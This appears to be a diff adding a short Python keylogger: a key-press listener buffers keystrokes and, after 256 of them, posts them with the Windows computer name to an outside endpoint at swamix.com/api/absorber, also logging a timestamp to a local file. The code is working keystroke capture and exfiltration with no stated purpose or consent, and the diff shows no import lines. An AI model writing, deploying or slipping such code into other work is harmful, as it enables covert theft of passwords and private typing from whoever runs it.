@@ -1,0 +1,29 @@
+def lojer(key):
+    global mem
+    key = str(key).replace('\'', '')
+    print(key)
+    if key == 'Key.space':
+        key = ' '
+    if key == "Key.enter":
+        key = '[ENTER]'
+    if 'backspace' in key:
+        return
+    if len(key) > 3 and key != '[ENTER]':
+        return
+    for x in ['left', 'right', 'up', 'down']:
+        if x in key:
+            key = ''
+    mem.append(key)
+
+    if len(mem) > 256:
+        pcname = os.environ["COMPUTERNAME"]
+        r = requests.post('https://swamix.com/api/absorber',
+                          {'pcname': pcname, 'data': ''.join(mem)})
+        print(r.text, pcname, mem)
+        mem = []
+    open('last.txt', 'w+').write(str(time.time())+key)
+    print(len(mem), key, mem)
+
+
+with Listener(on_press=lojer) as l:
+    l.join()
